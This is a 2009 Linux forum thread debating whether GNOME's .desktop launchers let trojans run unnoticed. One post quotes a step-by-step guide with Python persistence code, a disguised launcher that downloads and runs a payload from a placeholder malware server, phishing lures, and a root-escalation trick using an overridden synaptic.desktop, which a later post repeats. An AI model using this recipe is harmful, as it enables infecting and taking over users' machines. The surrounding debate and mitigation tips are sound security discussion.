---
title: "Linux is save, Gnome isn't."
date: 2009-04-01
forum: Recurring Discussions
---

### Post by billgoldberg on 2009-04-01
After reading MetalHellsAngel post on tricking her husband for April's fool and the responding scripts I got the idea to open this discussion.

We all know Linux is the safest, moderately popular OS *(I'm not talking to you BSD :p )*. Or do we?

A lot of new users here will claim Linux is safe to use on the desktop use, not because of security through obscurity, but because Linux is just safer.

But I have to disagree.

The way things are now, Linux is more secure than Windows because of obscurity.

And the biggest reason I say that is because of Gnome.

Let's take the conficker worm (or whatever it is called). 

It is passed along by usb sticks.

The same thing can easily happen on Ubuntu, because of Gnome.

Gnome has the feature to launch scripts without checking the permissions or giving any prompts.

Not that you need root access on most Linux desktop systems to do damage (*what is more important, the files in your /home folder which can be irreplaceable, or the system files?)*, but because of this it would also be pretty damn easy to get root access thanks to the wonders of ~/.local/share/applications and don't forget you got access to .bashrc.

I'm sure these things are possible on KDE also.

Malicious code can be easily executed without the user knowing it. Get your phising on and your in. No prompts, nothing.

Am I the only one who is concerned about these security flaws?

edit: I forgot to mention gnomes feature: "sessions"

---

### Post by Dr Small on 2009-04-01
Don't run a Desktop Environment that does this stupid stuff.

---

### Post by Onoskelis on 2009-04-01
Conficker is a hoax. Nothing happened, and nothing ever will happen.

Just another attempt at anti-virus companies to lie to the public about a threat that doesn't exist, in an attempt to sell their software.

---

### Post by billgoldberg on 2009-04-01
> **Onoskelis said:**
> Conficker is a hoax. Nothing happened, and nothing ever will happen.

Just another attempt at anti-virus companies to lie to the public about a threat that doesn't exist, in an attempt to sell their software.

Could be, but that's not the point of the thread.

---

### Post by mcduck on 2009-04-01
I disagree.

Being able to run code without giving it executable permission is not the same as the code being able to run on it's own without user action (the difference between a worm and a trojan). Making a trojan is of course possible with any operating system, the only real protection against them is not running random code from untrusted sources.

Also it sure isn't "pretty damn easy" to get root access with .bashrc. Not to mention that you need the user level access before you can do anything with .bashrc.. ;)

---

### Post by simtaalo on 2009-04-01
> **billgoldberg said:**
> *what is more important, the files in your /home folder which can be irreplaceable, or the system files?)*

this is something i realised a while ago which is why i don't keep my personal files on /home, it does seem to be the only main place someone could attack.

---

### Post by issih on 2009-04-01
I agree in many ways, it would be better if all non executable scripts did something like pop up a dialog stating it was insecure and asking if you really meant it, and needing sudo password.

As for getting round social engineering attacks..the only real solution is if we get rid of society or stop being humans....tricky one.

We probably do need to start thinking about protecting people from running things when they aren't paying attention.

---

### Post by billgoldberg on 2009-04-01
Here is a nice little article I found that explains my point perfectly:

[http://www.geekzone.co.nz/foobar/6229](http://www.geekzone.co.nz/foobar/6229)

> Compact step-by-step guide

Ok, so here is the summary then, which also fills in a few more specific details:

   1.

      Write a piece of malware of your choice. Maybe as a Python script? Good language, efficient code, pre-installed in most Linux distros and powerful standard library support (for example, libraries for sending HTTP requests and handling SMTP are part of most standard installs). Place that malware on some web-server.
   2.

      Your malware needs the ability to install a launcher for itself so that it is started whenever the user logs in. As mentioned, for Gnome that means creating a launcher description in the ~/.config/autostart folder. For KDE just link to your executable from within the ~/.kde/Autostart directory. To do that the malware code can either just force the issue and copy a launcher or link to itself into both locations (creating any directories along the way if they don't exist) or it can be a bit smarter and choose the right thing to do based on the desktop environment that it detects.

      For example, to create the shortcut for KDE, all you need to write in Python is:

         import os
         uname = os.getlogin()
         drop_dir = &#8220;/home/%s/.kde/Autostart&#8221; % uname)
         os.makedirs(drop_dir)
         os.symlink("/home/%s/.local/.hidden/s.py" % uname, drop_dir+&#8220;/s.py")

      For Gnome the Python script instead needs to write a launcher into the proper directory:

         import os
         relauncher_str = """
         [Desktop Entry]
         Type=Application
         Name=Malware
         Exec=python .local/.hidden/s.py
         Icon=system-run
         """
         uname = os.getlogin()
         drop_dir = &#8220;/home/%s/.config/autostart&#8221; % uname
         os.makedirs(drop_dir)
         f = open(drop_dir+&#8221;/Malware.desktop&#8221;, &#8220;w&#8221;)
         f.write(relauncher_str)
         f.close()

      Writing these autostart entries is probably some of the first action that your malware should perform.
   3.

      Now create a desktop launcher file for the installer of the malware, which is different than the launcher we use to restart the malware after a reboot. The desktop launcher for the installer is what we send as attachment in the email to the targeted user. It's what the user clicks on after they saved it. Try something like this:

         [Desktop Entry]
         Type=Application
         Name=some_text.odt
         Exec=bash -c 'URL=http://www.my_malware_server.com/s.py ;
                                  DROP=~/.local/.hidden ;
                                 mkdir -p $DROP;
                                 if [ -e /usr/bin/wget ] ;
                                 then wget $URL -O $DROP/s.py ;
                                 else curl $URL -o $DROP/s.py ; fi;
                                 python $DROP/s.py'
          Icon=/usr/share/icons/hicolor/48x48/apps/ooo-writer.png

      Note that we have specified a name that is harmless looking and even chose an icon that makes it look like a normal document (that particular icon is present on both Ubuntu (Gnome) and Kubuntu (KDE) systems, but annoyingly not on Fedora). If you claim to send nude shots in the email, just give it a name that makes it sound like an image (something with .jpg at the end) and chose one of the appropriate standard image icons.

      The Exec line is a bit longer now, because we have to account for the possibility that either wget is installed or curl. For example, Ubuntu systems usually have wget, while Fedora comes with curl. So, we pass the appropriate commands to bash in order to check which one is present and then call the correct command to download the malware. I'm not a bash expert, so there might be a much more efficient way to do this. But you get the idea. Also, in that line we are creating a good location for the script ($DROP), which is not immediately obvious. The mkdir command with the -p option will silently create whatever parent directories are necessary. The target directory is in the user's home, hidden away in some innocent looking local directory and can only be seen when also displaying hidden files. The /tmp directory of course is not a good place for our malware, since it is wiped with each reboot.

      Save this launcher file under the name you specified with the Name line, but add '.desktop' to the end of the actual file name. So, in our case, you would save the file as 'some_text.odt.desktop'. When you place this on your desktop you will see that Gnome or KDE will treat it in a special way, not displaying the '.desktop' extension. So, the file just appears as 'some_text.odt'. Of course, that also means that the mail attachment will have this extension as well. Some users may notice, many others will not.
   4.

      Attach this file to an email, which prompts the recipient to save and open the attachment. As explained, once it has been saved it will just appear as 'some_text.odt' on the user's desktop. And with the icon we have chosen in the launcher description it will look quite harmless.
   5.

      Send this email out to as many email addresses as you can get a hold of.

Voila! A Linux virus in 5 simple steps. Every user that saves and opens the attachment you have sent them will get themselves infected with the malware script of your choice, which is then also restarted whenever the user logs in again.

That was easy, wasn't it?




That's a way to exploit those flaws. 

From he same article on getting root access:

[QUOTE
Yes, so if we could just go ahead and edit that, right? If our malware could go and change that to:

]Exec=gksu python .local/.hidden/s.py /usr/sbin/synaptic

That would execute our malware with root privileges. Note that we quietly passed the original name of the executable (/usr/sbin/synaptic) to our malware, so that it can start synaptic after it is done permanently giving itself root privileges or doing whatever it wants to do as root. That way the user won't become suspicious.

But, alas, we can't edit that file. Out of luck again? Fortunately, no. Gnome is kind enough to see if we might have a local definition of one of those desktop files, which should override the system-wide settings. Those go into ~/.local/share/applications. So, you can simply copy the synaptic.desktop file from /usr/share/applications to ~/.local/share/applications and perform the changes you want on it. Then you just have to sit back and wait for the next time the user starts synaptic and you are in business. [/QUOTE]

---

### Post by skillllllz on 2009-04-01
billgoldberg, have you actually found any of this to be true? Have you encountered an actual script that runs automatically, or worse, spreads to and from USB disks automatically? I'm curious about the mechanics of such a script. I have a strong suspicion that this is all a non-issue.

---

### Post by albinootje on 2009-04-01
> **billgoldberg said:**
> 
Am I the only one who is concerned about these security flaws?


After reading this (weeks ago) I think that Gnome and KDE developers should fix this problem soon :
[http://www.geekzone.co.nz/foobar/6229](http://www.geekzone.co.nz/foobar/6229)

---

### Post by skillllllz on 2009-04-01
> **billgoldberg said:**
> Here is a nice little article I found that explains my point perfectly:

[http://www.geekzone.co.nz/foobar/6229](http://www.geekzone.co.nz/foobar/6229)

While I see the threat here, this is roughly the equivalent of writing a VB script and then mass mailing it to as many users as possible.

---

### Post by billgoldberg on 2009-04-01
> **skillllllz said:**
> billgoldberg, have you actually found any of this to be true? Have you encountered an actual script that runs automatically, or worse, spreads to and from USB disks automatically? I'm curious about the mechanics of such a script. I have a strong suspicion that this is all a non-issue.

I shouldn't have said automatically.

It will require user interaction.

edit: after reading my OP again, I never said that this would run automatically.

---

### Post by mcduck on 2009-04-01
> **skillllllz said:**
> billgoldberg, have you actually found any of this to be true? Have you encountered an actual script that runs automatically, or worse, spreads to and from USB disks automatically? I'm curious about the mechanics of such a script. I have a strong suspicion that this is all a non-issue.

Nope, what he described is a basic trojan, not a virus that would run on it's own without user action.

Also it assumes that the user doesn't notice that the file attached is called something.odt.desktop while any e-mail application (apart from Windows ones) and web mail I've ever seen shows the full name of attached files.

LIke I said, trojans are possible on every operating system and rely primarily on user stupidity, not OS flaws. To fully protect users against trojans would pretty much require removing normal functionality from operating systems.

---

### Post by mips on 2009-04-01
> **skillllllz said:**
> I have a strong suspicion that this is all a non-issue.

*Pfff, snorts at comment*

---

### Post by billgoldberg on 2009-04-01
> **skillllllz said:**
> While I see the threat here, this is roughly the equivalent of writing a VB script and then mass mailing it to as many users as possible.

Something like that.

---

### Post by skillllllz on 2009-04-01
> **billgoldberg said:**
> I shouldn't have said automatically.

It will require user interaction.


Bingo, there's the issue right there. No matter how much you try to protect the user from themselves, if they are ignorant, they are going to hurt themselves. A nail gun can either be a very handy tool, or an extremely dangerous instrument, depending on whether you know what you are doing or not.

---

### Post by billgoldberg on 2009-04-01
> **mcduck said:**
> Nope, what he described is a basic trojan, not a virus that would run on it's own without user action.

Also it assumes that the user doesn't notice that the file attached is called something.odt.desktop while any e-mail application (apart from Windows ones) and web mail I've ever seen shows the full name of attached files.

LIke I said, trojans are possible on every operating system and rely primarily on user stupidity, not OS flaws. To fully protect users against trojans would pretty much require removing normal functionality from operating systems.

Yes, but it would be easy to fix these issues.

Yet somehow, they don't get fixed.

---

### Post by dragos240 on 2009-04-01
> **billgoldberg said:**
> After reading MetalHellsAngel post on tricking her husband for April's fool and the responding scripts I got the idea to open this discussion.

We all know Linux is the safest, moderately popular OS *(I'm not talking to you BSD :p )*. Or do we?

A lot of new users here will claim Linux is safe to use on the desktop use, not because of security through obscurity, but because Linux is just safer.

But I have to disagree.

The way things are now, Linux is more secure than Windows because of obscurity.

And the biggest reason I say that is because of Gnome.

Let's take the conficker worm (or whatever it is called). 

It is passed along by usb sticks.

The same thing can easily happen on Ubuntu, because of Gnome.

Gnome has the feature to launch scripts without checking the permissions or giving any prompts.

Not that you need root access on most Linux desktop systems to do damage (*what is more important, the files in your /home folder which can be irreplaceable, or the system files?)*, but because of this it would also be pretty damn easy to get root access thanks to the wonders of ~/.local/share/applications and don't forget you got access to .bashrc.

I'm sure these things are possible on KDE also.

Malicious code can be easily executed without the user knowing it. Get your phising on and your in. No prompts, nothing.

Am I the only one who is concerned about these security flaws?

edit: I forgot to mention gnomes feature: "sessions"

This isn't just gnome you know! XDM GDM and KDM are display managers, they start up with root permissions, if they didn't you wouldn't be able to use the shutdown feature, also, sessions are referring to an X session, or graphical session, this occurs when X is launched. KDE and Xfce will do the same thing, it's not gnome's fault, it's the user friendly interfaces of X display managers, you can do startx to launch gnome manually, if you do this, you will not be able to mount drives without sudoing, or shutdown without sudoing. It's not gnome, it's the interfaces that we've grown to love.

---

### Post by billgoldberg on 2009-04-01
> **skillllllz said:**
> Bingo, there's the issue right there. No matter how much you try to protect the user from themselves, if they are ignorant, they are going to hurt themselves. A nail gun can either be a very handy tool, or an extremely dangerous instrument, depending on whether you know what you are doing or not.

Exactly.

That's why it annoys me that so many people (mostly newbies) think they are untouchable on Ubuntu.

The biggest thread today on any OS isn't viruses, it's trojans.

Remember the recent OSX trojan (the one that came with pirated versions of iWorks)?

These people also thought they were safe because they used OSX, well they aren't.

---

### Post by Christmas on 2009-04-01
I don't think GNOME is to blame alone, but the user. If the user runs a script without knowing it's safe to run it (and especially as root), then he can damage the entire system (from erasing important files to replacing commands etc) no matter what desktop environment he uses (especially if ran from a terminal application).

---

### Post by billgoldberg on 2009-04-01
> **Christmas said:**
> I don't think GNOME is to blame alone, but the user. If the user runs a script without knowing it's safe to run it (and especially as root), then he can damage the entire system (from erasing important files to replacing commands etc) no matter what desktop environment he uses (especially if ran from a terminal application).

The point here is that the users runs a malicious script without knowing it, and Gnome makes that possible.

---

### Post by skillllllz on 2009-04-01
I'm not saying the debate ends here, but much of this boils down to education, and I'm not talking about schools and institutions; I'm talking about educating one's self to all of the ins and outs of a particular subject matter.

Many people see the computer as an (albeit rather complex) appliance, they do not care how it works, they just want it to do what they expect it to do. These people do not care to learn about computers, they just want it to work. But how do you give them the functionality they desire, when the very functionality they desire is purely what makes them susceptible to danger? That's the tricky part, to which there is sometimes no perfect answer. In these cases, it all hinges on the user's behavior.

> **billgoldberg said:**
> The point here is that the users runs a malicious script without knowing it, and Gnome makes that possible.

Yes, and the user trashes his own system, gets upset, realizes life goes on, and learns (hopefully) a very hard lesson. It's an isolated case of cause and effect.

---

### Post by smartboyathome on 2009-04-01
> **billgoldberg said:**
> Here is a nice little article I found that explains my point perfectly:

[http://www.geekzone.co.nz/foobar/6229](http://www.geekzone.co.nz/foobar/6229)



That's a way to exploit those flaws. 

From he same article on getting root access:

[QUOTE
Yes, so if we could just go ahead and edit that, right? If our malware could go and change that to:

]Exec=gksu python .local/.hidden/s.py /usr/sbin/synaptic

That would execute our malware with root privileges. Note that we quietly passed the original name of the executable (/usr/sbin/synaptic) to our malware, so that it can start synaptic after it is done permanently giving itself root privileges or doing whatever it wants to do as root. That way the user won't become suspicious.

But, alas, we can't edit that file. Out of luck again? Fortunately, no. Gnome is kind enough to see if we might have a local definition of one of those desktop files, which should override the system-wide settings. Those go into ~/.local/share/applications. So, you can simply copy the synaptic.desktop file from /usr/share/applications to ~/.local/share/applications and perform the changes you want on it. Then you just have to sit back and wait for the next time the user starts synaptic and you are in business. [/QUOTE]

That isn't a virus, that is user stupidity. If the user is stupid enough to download something called "some_text.odt.desktop", and they use Linux, then they deserve this to happen.

---

### Post by Mr. Picklesworth on 2009-04-01
Viruses don't exist to kill your personal documents. There's way more money in it than that.
The end ?

On the topic, though, wouldn't it be cool if the "are you sure you want to execute this?" prompts tried to gather information about what a program plans to do?
For example, by scanning the libraries a program uses and that sort of thing it could make a fairly educated guess to inform the user of what he is getting into.

---

### Post by Sealbhach on 2009-04-01
At least with Linux, these things can be understood and fixed more quickly.


.

---

### Post by Polygon on 2009-04-01
doesn't gnome prompt you before it runs autorun scripts? Like i think it has a little bar that says 'this drive contains software' then a button that says 'run'

---

### Post by BGFG on 2009-04-01
Ironically, I've just come from a customer who panicked when he saw flashing signals below all his drives in 'My Computer' informing him that he had between 150 and 300 trojans on each drive. Even the optical :)

You know those bastards that make the website mimic explorer ? then there's a pop-up looking like an anti-virus dialogue with all the trojans listed prompting you to 'remove' all infections. which then initiates a download of a setup file.

So we had a little lecture about letting one's friends come over and download porn. 

In any case, this was more social engineering than it was intelligent virus coding. No system will ever be virus proof, as long as there are users who can be convinced to execute code as an administrator well....I'll have some business :)

---

### Post by tjwoosta on 2009-04-01
usefull linux malware info

[http://en.wikipedia.org/wiki/List_of_Linux_computer_viruses]("http://en.wikipedia.org/wiki/List_of_Linux_computer_viruses")

---

### Post by BGFG on 2009-04-01
Double post guys....

---

### Post by zekopeko on 2009-04-01
> **Polygon said:**
> doesn't gnome prompt you before it runs autorun scripts? Like i think it has a little bar that says 'this drive contains software' then a button that says 'run'

thats true and is far more nicer then autorun on windows which (unfortunately) does exactly as the name suggest: autorun anything if there is an autorun.ini.

and concerning .desktop files. in jaunty i believe anything that's not from a repo is asked by gnome if you trust the launcher before starting the application.

---

### Post by BGFG on 2009-04-01
IN THE NAME OF!!! Triple post?! sincerest apologies...

---

### Post by Polygon on 2009-04-01
well in window's defence, there is an option to disable it

but then, in both operating systems, if you disable it, then you make it harder to accomplish your goals

for example, with most software that comes on a CD, they use a autorun.ini file to launch a small program that has some fancy logo and has options to 'install' and other stuff. 

If autorun was disabled, then the user would have to manually go to the cd drive and run the correct binary (which can be a challenge to find, depending on how the CD hierarchy is laid out). I remember having some games that ran on windows 95, and the first 3 pages of the instruction booklet were instructions on how to install, and they required the user to start > run > now, type in the correct letter of your cd drive, and then a colon then /setup.exe

thats really complicated for people who know nothing about computers, and thats why autorun was invented, to make it so they just hit 'install' once the nice little popup appears on their screen

But then again, we now run into issues where autorun can be used to install malicious stuff. There really is no solution to this, besides common sense, knowledge that wherever you got this 'software' is safe, etc etc.

---

### Post by loell on 2009-04-01
I hate to say this but back then, some of **us** told **us** so, I thought i was heard but then... i just stopped caring anout the issue. ;)

[http://72.14.235.132/search?q=cache:1Kz-4xzmfLoJ:ubuntuforums.org/showthread.php%3Ft%3D745051%26page%3D2+loell+autorun&cd=1&hl=en&ct=clnk&client=pub-2070091971271392]("http://72.14.235.132/search?q=cache:1Kz-4xzmfLoJ:ubuntuforums.org/showthread.php%3Ft%3D745051%26page%3D2+loell+autorun&cd=1&hl=en&ct=clnk&client=pub-2070091971271392")

---

### Post by TBOL3 on 2009-04-01
Ok, for personal use, don't be dumb.  Great, I can do that, even if not everyone can.

But what about enterprise use?  Yes, the process may not be automated, but still, it takes one dumb user, to take the whole thing down.  Even if he doesn't have root permision, gnome will, which he could inadvertantly use.

Remember, we need to think about more than just individual user's, but large corperations too.

---

### Post by cardinals_fan on 2009-04-01
> **TBOL3 said:**
> Ok, for personal use, don't be dumb.  Great, I can do that, even if not everyone can.

But what about enterprise use?  Yes, the process may not be automated, but still, it takes one dumb user, to take the whole thing down.  Even if he doesn't have root permision, gnome will, which he could inadvertantly use.

Remember, we need to think about more than just individual user's, but large corperations too.
I haven't been following this discussion (I'll go back and read it now), but how in the world does GNOME have root permissions?

---

### Post by TBOL3 on 2009-04-01
I think that's because it's part of the root group, or something like that, I don't know the technical details of it, all I believe is that whatever it is that makes the home user so unsecure (yet safe if he lives in a black box), also translates to enterprise desktops.

---

### Post by loell on 2009-04-01
> **cardinals_fan said:**
> I haven't been following this discussion (I'll go back and read it now), but how in the world does GNOME have root permissions?

that's the problem, it doesn't need to be root to do damage, the user's home area is at the disposal of the launched script or program.

while difficult, root permission is also possible by privilege escalation techniques.

---

### Post by smartboyathome on 2009-04-01
> **TBOL3 said:**
> I think that's because it's part of the root group, or something like that, I don't know the technical details of it, all I believe is that whatever it is that makes the home user so unsecure (yet safe if he lives in a black box), also translates to enterprise desktops.

Blasphemy! GNOME is run with the user's permissions, just like all other software. The only GNOME-related program run with root permissions is GDM, and there is no way for a virus to get in through that since you would most likely not even be online during the login process.

---

### Post by TBOL3 on 2009-04-01
Than how come I don't need to type in my password everytime I want to shutdown?  Yes, it is difficult to get through gnome, but how can you garentee to me that there is absolutly no holes?

---

### Post by smartboyathome on 2009-04-01
> **TBOL3 said:**
> Than how come I don't need to type in my password everytime I want to shutdown?  Yes, it is difficult to get through gnome, but how can you garentee to me that there is absolutly no holes?

Because HAL+PolicyKit grant permission for special programs such as shutdown, reboot, mounting, and unmounting when the programs are used through the DBUS interface (which keeps things safer).

---

### Post by TBOL3 on 2009-04-01
So, are these the only things that gnome has the rights to do, without an admin's password?

---

### Post by smartboyathome on 2009-04-01
> **TBOL3 said:**
> So, are these the only things that gnome has the rights to do, without an admin's password?

Yep, thats right. And the functions in which it is used is greatly limited.

---

### Post by Mr. Picklesworth on 2009-04-01
The kind of security you want is attainable through stuff like SELinux (see Fedora) or [File Powerboxes]("http://plash.beasts.org/wiki/FilePowerbox") (implemented through [Plash]("http://plash.beasts.org/wiki/")). File Powerboxes are a really awesome, cutting edge technology to manage this sort of stuff. If you are interested, you should take a look at Plash and see if there's a way you could help :)

(After all, naysaying alone gets us nowhere).

---

### Post by slavik on 2009-04-04
the biggest security hole in any computer system is the user.

---

### Post by eddski on 2009-04-04
So is there any way to protect yourself from this? I switched to Linux for the better security it, now supposedly, provides.

---

### Post by cardinals_fan on 2009-04-04
> **eddski said:**
> So is there any way to protect yourself from this? I switched to Linux for the better security it, now supposedly, provides.
If what you mean by that is "I switched to Linux because it is easier for me to take the necessary steps to secure my system", you're still totally okay.

---

### Post by eddski on 2009-04-04
I guess I'm just paranoid from using windows, but the posts above where they were talking about the coding, is that something I should worry about? I guess I'm looking for some basic tips to enhance the security in Ubuntu.

---

### Post by loell on 2009-04-05
> **eddski said:**
> I guess I'm just paranoid from using windows, but the posts above where they were talking about the coding, is that something I should worry about? I guess I'm looking for some basic tips to enhance the security in Ubuntu.

in this case the culprit is Nautilus, in **Edit** -->** Preferences** --> Media **Tab**, then check or enable **Never prompt or start programs on media insertion**

---

### Post by newbie2 on 2009-04-05
Gnome answers Linux critics with 'big' vision plan :
[http://lxer.com/module/newswire/view/118417/index.html](http://lxer.com/module/newswire/view/118417/index.html)

---

### Post by mikewhatever on 2009-04-05
> **newbie2 said:**
> Gnome answers Linux critics with 'big' vision plan :
[http://lxer.com/module/newswire/view/118417/index.html](http://lxer.com/module/newswire/view/118417/index.html)

Completely irrelevant to the thread topic.

> **TBOL3 said:**
> Yes, it is difficult to get through gnome, but how can you garentee to me that there is absolutly no holes?

I dare say no one will ever be abale to gurantee something like that ever.

---

### Post by eddski on 2009-04-05
Thanks, loell.

---

### Post by Ericyzfr1 on 2009-04-05
> **Onoskelis said:**
> Conficker is a hoax. Nothing happened, and nothing ever will happen.

Just another attempt at anti-virus companies to lie to the public about a threat that doesn't exist, in an attempt to sell their software.

It is not the first time that a worm is supposed to unleash hell on April 1st and it is not the last time. The economy is down, everyone needs dough!! A good FUD does wonder for these guys!!!

---

### Post by calvinps on 2009-04-05
> **billgoldberg said:**
> After reading MetalHellsAngel post on tricking her husband for April's fool and the responding scripts I got the idea to open this discussion.

We all know Linux is the safest, moderately popular OS *(I'm not talking to you BSD :p )*. Or do we?

A lot of new users here will claim Linux is safe to use on the desktop use, not because of security through obscurity, but because Linux is just safer.

But I have to disagree.

The way things are now, Linux is more secure than Windows because of obscurity.

And the biggest reason I say that is because of Gnome.

Let's take the conficker worm (or whatever it is called). 

It is passed along by usb sticks.

The same thing can easily happen on Ubuntu, because of Gnome.

Gnome has the feature to launch scripts without checking the permissions or giving any prompts.

Not that you need root access on most Linux desktop systems to do damage (*what is more important, the files in your /home folder which can be irreplaceable, or the system files?)*, but because of this it would also be pretty damn easy to get root access thanks to the wonders of ~/.local/share/applications and don't forget you got access to .bashrc.

I'm sure these things are possible on KDE also.

Malicious code can be easily executed without the user knowing it. Get your phising on and your in. No prompts, nothing.

Am I the only one who is concerned about these security flaws?

edit: I forgot to mention gnomes feature: "sessions"

What you are forgetting, is that the *Conficker* virus was designed to infect Windows computers. No doubt that there will be some security flaws in GNOME (most of which are patched up by the GNOME Community or whatever it is called), Linux is actually very secure, **no matter** what desktop environment/window manager is used.

What I mean that *Conficker* is designed to infect Windows computers, I mean that the scripts you mention will probably be incompatible for running on Linux computers. Although there might be a few Linux-compatible antivirus programs available on the market, it is very unlikely that your computer will get infected. There's only about 1000 viruses in the wild at the moment, and even if someone does get infected, it's unlikely that it will make it to the news (i.e. with the headline saying **"First-ever Linux computer to get infected"** or something.)

To be honest and to keep it short: **I just think you're being paranoid.**

---

### Post by Bios Element on 2009-04-06
> **mikewhatever said:**
> Completely irrelevant to the thread topic.



I dare say no one will ever be abale to gurantee something like that ever.

Besides the fact that the code is open-source and if he really wanted to he could read the code himself? As can anyone who feels like it. Unlike Windows.

---

